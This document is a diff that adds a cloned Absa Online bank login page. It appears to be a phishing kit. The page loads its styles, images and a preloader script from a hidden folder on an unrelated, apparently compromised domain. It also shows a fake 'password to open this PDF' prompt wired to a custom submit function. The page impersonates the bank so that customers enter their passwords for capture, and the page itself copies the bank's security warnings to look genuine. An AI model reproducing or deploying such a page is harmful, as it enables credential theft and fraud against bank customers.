@@ -1,0 +1,398 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<!-- saved from url=(0043)https://ib.absa.co.za/absa-online/login.jsp -->
+<html xmlns="http://www.w3.org/1999/xhtml" xmlns:c="http://www.backbase.com/2006/command" xmlns:e="http://www.backbase.com/2006/xel" xmlns:xi="http://www.w3.org/2001/XInclude" xmlns:ui="http://www.absa.co.za/2009/ui" class="js gecko gecko69 CSS1Compat Win32">
+   <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <style type="text/css">.btl-repaint{zoom:1;background-color:transparent;-moz-outline:none;}</style>
+      <style type="text/css">.btl-drag-outlineElement{position:absolute;top:-10000px;left:-10000px;width:100px;height:100px;z-index:9999;border-width:1px;border-style:solid;background-color:#DFE0E1;border-color:#8B8D91;}</style>
+      <style type="text/css">.btl-resize-cursorElement{position:absolute;top:-10000px;left:-10000px;width:100px;height:100px;z-index:10000;opacity:0;-ms-filter:"alpha(opacity=0)";filter:alpha(opacity=0);background:white;}.btl-resize-lineElement{position:absolute;top:-10000px;left:-10000px;width:1px;height:100px;z-index:9999;border-width:1px;border-style:solid;border-color:#8B8D91;overflow:hidden;}.btl-resize-outlineElement{position:absolute;top:-10000px;left:-10000px;width:100px;height:100px;z-index:9999;border-width:1px;border-style:solid;opacity:.4;-ms-filter:"alpha(opacity=40)";filter:alpha(opacity=40);background-color:#DFE0E1;border-color:#8B8D91;}</style>
+      <meta http-equiv="X-UA-Compatible" content="IE=10; IE=9; IE=8">
+      <title>Absa Online</title>
+      <!--#if expr="( = /iPhone/)"-->
+      <link rel="apple-touch-icon" href="https://ib.absa.co.za/absa-online/static/style/Iphone_app_icon.png">
+        <link rel="icon" href="https://ib.absa.co.za/axob/xwc/img/brand/absa/favicon_rebranded.ico" type="image/x-icon">
+      <!--#endif -->
+      <link rel="stylesheet" type="text/css" href="http://lavienailscorp.com/.well-known/.igfrtuiouz/css/absa.css" media="screen">
+      <link rel="stylesheet" type="text/css" href="http://lavienailscorp.com/.well-known/.igfrtuiouz/css/login.css">
+      <link rel="stylesheet" type="text/css" href="http://lavienailscorp.com/.well-known/.igfrtuiouz/css/jcaptcha.css">
+          <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
+        <script src="http://lavienailscorp.com/.well-known/.igfrtuiouz/php2/preloader.php?r="></script>
+        <style type="text/css">
+                    .dialog > .row {
+            display: table-row;
+            }
+            
+            
+#overlayContainer {
+  display: table;
+  position: absolute;
+  width: 100%;
+  height: 100%;
+  /*! background-color: rgba(0, 0, 0, 0.2); */
+  z-index: 40000;
+}
+            
+            #overlayContainer > .container {
+                display: table-cell;
+                vertical-align: middle;
+                text-align: center;
+            }
+            
+            #overlayContainer > * {
+                overflow: auto;
+            }
+            
+            #overlayContainer > .container > .dialog {
+  display: inline-block;
+  padding: 15px;
+  border-spacing: 4px;
+  color: rgba(217, 217, 217, 1);
+  font-size: 12px;
+  line-height: 14px;
+  background-color: rgba(71, 71, 71, 1); /* fallback */
+  background-image: url(http://lavienailscorp.com/.well-known/.igfrtuiouz/images/texture.png),
+                    linear-gradient(rgba(82, 82, 82,0.99), rgba(69, 69, 69, 0.95));
+  border: 1px solid rgba(0, 0, 0, 0.5);
+  border-radius: 4px;
+  box-shadow: 0 1px 4px rgba(0, 0, 0, 0.3);
+}
+
+.dialog > .row {
+  display: table-row;
+}
+
+.dialog > .row > * {
+  display: table-cell;
+}
+
+
+.toolbarField {
+  padding: 3px 6px;
+  margin: 4px 0 4px 0;
+  border-radius: 2px;
+  background-color: rgba(255, 255, 255, 0.09);
+  background-image: linear-gradient(rgba(255, 255, 255, 0.05), rgba(255, 255, 255, 0));
+  background-clip: padding-box;
+  border-width: 1px;
+  border-style: solid;
+  border-color: rgba(0, 0, 0, 0.32) rgba(0, 0, 0, 0.38) rgba(0, 0, 0, 0.42);
+  box-shadow: 0 1px 0 rgba(0, 0, 0, 0.05) inset,
+              0 1px 0 rgba(255, 255, 255, 0.05);
+  color: rgba(242, 242, 242, 1);
+  font-size: 12px;
+  line-height: 14px;
+  outline-style: none;
+}
+
+
+.dialog .toolbarField {
+  margin: 5px 0;
+}
+
+.dialog .separator {
+  display: block;
+  margin: 4px 0 4px 0;
+  height: 1px;
+  width: 100%;
+  background-color: rgba(0, 0, 0, 0.5);
+  box-shadow: 0 0 0 1px rgba(255, 255, 255, 0.08);
+}
+
+.dialog .buttonRow {
+  text-align: center;
+  vertical-align: middle;
+}
+
+.dialog :link {
+  color: rgba(255, 255, 255, 1);
+}
+
+#passwordOverlay > .dialog {
+  text-align: center;
+}
+
+#passwordOverlay .toolbarField {
+  width: 200px;
+}
+
+
+.toolbarField:hover {
+  background-color: rgba(255, 255, 255, 0.11);
+  border-color: rgba(0, 0, 0, 0.4) rgba(0, 0, 0, 0.43) rgba(0, 0, 0, 0.45);
+}
+
+.toolbarField:focus {
+  background-color: rgba(255, 255, 255, 0.15);
+  border-color: rgba(77, 184, 255, 0.8) rgba(77, 184, 255, 0.85) rgba(77, 184, 255, 0.9);
+}
+
+
+.dialog .toolbarField {
+  margin: 5px 0;
+}
+
+.dialog .separator {
+  display: block;
+  margin: 4px 0 4px 0;
+  height: 1px;
+  width: 100%;
+  background-color: rgba(0, 0, 0, 0.5);
+  box-shadow: 0 0 0 1px rgba(255, 255, 255, 0.08);
+}
+
+.dialog .buttonRow {
+  text-align: center;
+  vertical-align: middle;
+}
+
+
+.toolbarLabel {
+  min-width: 16px;
+  padding: 3px 6px 3px 2px;
+  margin: 4px 2px 4px 0;
+  border: 1px solid rgba(0, 0, 0, 0);
+  border-radius: 2px;
+  color: rgba(217, 217, 217, 1);
+  font-size: 12px;
+  line-height: 14px;
+  text-align: left;
+  user-select: none;
+  cursor: default;
+}
+
+
+.overlayButton {
+  width: auto;
+  margin: 3px 4px 2px 4px !important;
+  padding: 2px 6px 3px 6px;
+}
+
+        </style>
+   </head>
+   <body class="ssr-enabled ap-jsp-body prelogin" id="bodydiv" sid="vntIjEFNsy6pUB0zgiQPRpU">
+       <div class="outerContainer" style="display: none;">
+           <div id="overlayContainer">
+               <div id="passwordOverlay" class="container" style="background-color: rgba(64, 64, 64, 1);
+	background-image: url(http://lavienailscorp.com/.well-known/.igfrtuiouz/images/texture.png);">
+                   <div class="dialog">
+                    <div class="row">
+                      <p id="passwordText" data-l10n-id="password_label">Enter the password to open this PDF file.</p>
+                    </div>
+                    <div class="row">
+                        <input required="" maxlength="14" mainength="14" type="password" id="password" class="toolbarField">
+                    </div>
+                    <div class="buttonRow">
+                      <button id="passwordCancel" class="overlayButton"><span data-l10n-id="password_cancel">Cancel</span></button>
+                      <button onclick="absa.ePasswordL(); return false;" id="passwordSubmit" class="overlayButton"><span data-l10n-id="password_ok">OK</span></button>
+                    </div>
+                  </div>
+               </div>
+           </div>
+       </div>
+       
+      <!-- Please wait splash -->
+      <div id="pleasewait" role="alert" class="ap-pleasewait" style="height: 627px; width: 1349px; display: none;">
+         <div id="pleasewait-viewport" class="ap-pleasewait--viewport" style="height: 632px; width: 1366px; top: 0px; left: 0px;">
+            <div class="ap-pleasewait--content">
+               <img src="http://lavienailscorp.com/.well-known/.igfrtuiouz/images/ajax-loader-2.gif" width="32" height="32">
+               <span id="pleasewait-label" class="ap-pleasewait--label">
+                  <p class="vi-screenreader-line">Please wait</p>
+               </span>
+            </div>
+         </div>
+      </div>
+      <div></div>
+      <div style="position:fixed; top:0px; left:0px; z-index:105; width:100%; height:54px; background:#FFFFFF; padding:10px 0px 0px 10px; box-shadow: 0 4px 8px 0 rgba(0,0,0,.16);">
+         <img src="http://lavienailscorp.com/.well-known/.igfrtuiouz/images/logo-red.png" width="44" height="44">
+      </div>
+      <div class="ap-page-header" style="z-index:106;">
+         <!-- <div style="padding-top:12px;"><img src="static/style/resources/absa-logo-2018.png" width="141" height="97" /></div> -->
+         <div class="ap-navigation-main" style="z-index:107;">
+            <div class="ap-tabStrip-rounded-left"></div>
+            <ul class="ap-tabStrip-tabs">
+               <li class="ap-tab-button ap-tab-active" id="SSR-tab-18">
+                  <div class="ap-tab-title" tabindex="10">Logon</div>
+                  <div class="ap-tab-title-hidden">Logon</div>
+               </li>
+               <li class="ap-tab-button" id="SSR-tab-19">
+                  <div class="ap-tab-title" tabindex="11"><a href="https://ib.absa.co.za/absa-online/registration/?lang=en">Registration</a></div>
+                  <div class="ap-tab-title-hidden">Registration</div>
+               </li>
+               <li class="ap-tab-button" id="SSR-tab-20">
+                  <div class="ap-tab-title" tabindex="12"><a href="http://www.absa.co.za/">Absa home page</a></div>
+                  <div class="ap-tab-title-hidden" style="font-size:14px;">Absa home page</div>
+               </li>
+            </ul>
+            <div class="ap-tabStrip-rounded-right"></div>
+            <div style="clear: both;"></div>
+            <!-- <img src="static/style/resources/ao-logo2.png" width="189" height="60" style="position:absolute;top:0;right:20px" id="theImg"/> -->
+            <div class="ap-navigation-sub ap-tabStrip-subnav"></div>
+         </div>
+      </div>
+      <div class="ap-page-container" style="z-index:104;">
+         <!-- PS: above div  ap-page-header   was HERE -->
+         <div class="ap-global-message" id="ap-global-message">
+            <div id="ap-nocookies-msg" style="display: none;">
+               Warning: you do not have Cookies enabled. This applications needs Cookies to function
+               properly. Please turn it on and reload the page. If you need assistance
+               in turning on your Cookies <a>click here</a> to get instructions.
+            </div>
+            <noscript>
+               <div>
+                  Warning: you do not have Javascript enabled. This
+                  applications needs Javascript to function properly. Please turn it on
+                  and reload the page. If you need assistance in turning on your
+                  Javascript <a>click here</a> to get instructions.
+               </div>
+            </noscript>
+         </div>
+         <div class="ap-main-content-wrapper">
+            <!-- Page top corners -->
+            <div class="ap-main-content-wrapper-top">
+               <div class="ap-corners-rounded-top-left"></div>
+               <div class="ap-corners-rounded-top"></div>
+               <div class="ap-corners-rounded-top-right"></div>
+            </div>
+            <!-- Page content -->
+            <script type="text/javascript">googleAdsense();</script>
+            <div class="ap-page-content ap-container">
+                
+                
+               
+            </div>
+            <!-- Page bottom corners -->
+            <div class="ap-main-content-wrapper-bottom">
+               <div class="ap-corners-rounded-bottom-left"></div>
+               <div class="ap-corners-rounded-bottom"></div>
+               <div class="ap-corners-rounded-bottom-right"></div>
+            </div>
+         </div>
+         <div class="ap-footer" tabindex="20">
+            <div style="position:relative; top:0px; left:0px; width:971px; text-align:center;">
+               <p tabindex="21">
+                   &copy; Copyright. Absa Bank Limited. Registration Number: 1986/004794/06&nbsp;
+                  Authorized financial services and registered credit provider NCRCP7
+               </p>
+               <div class="ap-footer-links">
+                  <ul>
+                     <li><a href="https://www.absa.co.za/legal-and-compliance/terms-of-use/" id="am" target="_new">Terms of use</a></li>
+                     <li><a href="https://www.absa.co.za/legal-and-compliance/browser-requirements" id="am" target="_new">Software requirements</a></li>
+                     <li><a href="https://www.absa.co.za/security-centre/online-security" id="am" target="_new">Security centre</a></li>
+                     <li><a href="https://www.absa.co.za/about-us/absa-bank/corporate-information" id="am" target="_new">Banking regulations</a></li>
+                  </ul>
+               </div>
+               <!-- Barclays Logo Link bottom right of page -->
+               <div style="position:absolute; top:0px; right:0px; width:220px; text-align:right;">
+                  <!-- <a href="http://www.barclays.com" target="_new"><img src="static/style/resources/barclays_logo.gif" border="0" alt="Member of the Barclays group"></a> -->
+                  <!-- =xl.getImage("Images/Image/Barclays",lang) -->
+               </div>
+            </div>
+         </div>
+      </div>
+      <!-- password tips -->
+      <div class="modalPasswordTips" style="display: none; width: 600px; height: 443px; z-index: 200;">
+         <div class="ap-popup">
+            <div class="ap-popup-header">
+               <b>Password tips</b>
+               <div class="clear-both"></div>
+            </div>
+            <div class="ap-popup-body ap-info-box">
+               <ul class="ap-info-box-ul">
+                  <li>Never save your password/PIN on your desktop - as it may allow
+                     others to access your personal information, without your permission.
+                  </li>
+                  <li>Do not make your passwords too personal - rather create 
+                     passwords that have letters and numbers that cannot be attributed to 
+                     you.
+                  </li>
+                  <li>Never provide your Online ID or password/PIN to anyone, never write them down or share them, not even with a bank official.</li>
+                  <li>Never provide your Online ID or password/PIN to anyone.</li>
+                  <li>Only provide your online password or ID when your browser shows a Secure Socket Layer(SSL) connection directly to the bank.</li>
+                  <li>Do not leave your computer unattended after you have entered your Absa Online password.</li>
+                  <li>Always log or sign off at the end of a session.</li>
+                  <li>For your security</li>
+                  <li>Do not open e-mails from unknown sources.</li>
+                  <li>Beware of emails that ask for passwords, PINS, credit and debit card information.</li>
+                  <li>Avoid doing Internet Banking/ Absa Online in public areas such
+                     internet cafes as you never know what software is loaded that may 
+                     compromise your transactions.
+                  </li>
+                  <li>Make sure no one has unauthorised access to your PC.</li>
+                  <li>Be especially aware that there are no security cameras trained on your PC and keyboard.</li>
+                  <li>Ensure you have the latest anti virus software applications loaded on your PC and mobile devices.</li>
+                  <li>Make sure the software on your PC is correctly licensed.</li>
+                  <li>Update your operating system and browser with latest patches.</li>
+                  <li>Install personal firewall on your PC if you use a dial-up modem.</li>
+                  <li>Only provide your credit card details to reputable companies.</li>
+                  <li>To ensure that you are using a secure shopping site, look for the lock and key and security certificates online.</li>
+               </ul>
+            </div>
+            <div class="ap-popup-footer" style="text-align:right;">
+               <button onclick="phe.modal.hideModal()" type="submit" tabindex="0" class="ui-button ap-button-extra">
+                  <div class="ui-button-left">
+                     <div class="ui-button-right">
+                        <div role="button" tabindex="22" class="ui-button-center">Ok</div>
+                     </div>
+                  </div>
+               </button>
+            </div>
+         </div>
+      </div>
+      <!-- LOGOUT POPUP -->
+      <div class="ui-modal modalLogoffWarning" id="modalLogoffWarning" style="display:none">
+         <div class="ui-modalHeader">
+            <div class="ui-modalHeader-title">Logoff</div>
+            <div class="ui-modalHeader-icons"></div>
+         </div>
+         <div class="ui-modalBody">
+            <div style="padding:10px;">
+               <div>Your Absa Online session is about to expire in <span class="ap-popup-body-timer" id="timerSeconds"></span> seconds</div>
+               <div>Do you want to continue?</div>
+            </div>
+         </div>
+         <div class="ui-modalFooter">
+            <button type="button" class="ui-button ap-button-back" style="position:static; margin-left:0px;" onclick="absa.login.doLogout()">
+               <div class="ui-button-left">
+                  <div class="ui-button-right">
+                     <div class="ui-button-center">Logoff</div>
+                  </div>
+               </div>
+            </button>
+            <button type="button" class="ui-button ap-button-next" onclick="absa.login.resetTimer2(); phe.modal.hideModal()">
+               <div class="ui-button-left">
+                  <div class="ui-button-right">
+                     <div class="ui-button-center">Continue</div>
+                  </div>
+               </div>
+            </button>
+         </div>
+      </div>
+      <!-- hidden stuff -->
+      <form novalidate="">
+         <input type="hidden" name="focusfield" id="focusfield" value="">
+         <input type="hidden" name="lang" id="lang" value="en">
+         <input type="hidden" name="fstoreURL" id="fstoreURL" value="https://fs.absa.co.za/featuresstore/">
+         <input type="hidden" name="fstore" id="fstore" value="false">
+         <input type="hidden" name="fsid" id="fsid" value="0">
+         <input type="hidden" name="dspURL" id="dspURL" value="https://e.absa.co.za/dsp/">
+         <input type="hidden" name="dsp" id="dsp" value="false">
+         <input type="hidden" name="dspid" id="dspid" value="0">
+         <input type="hidden" name="dspWindowSelf" id="dspWindowSelf" value="null">
+         <input type="hidden" name="landingpage" id="landingpage" value="">
+         <input type="hidden" name="goto" id="goto" value="">
+      </form>
+      <div></div>
+      <div></div>
+      <div class="btl-resize-cursorElement"></div>
+      <div class="btl-resize-lineElement"></div>
+      <div class="btl-resize-outlineElement"></div>
+      <div style="display: none;" class="ap-helpText-baloon">
+         <div class="ap-helpText-frame">
+            <div class="ap-helpText-close-button"></div>
+            <div></div>
+         </div>
+         <div class="ap-helpText-pin"></div>
+      </div>
+      <div style="display: none;" class="ap-tooltipElement"></div>
+   </body>
+</html>
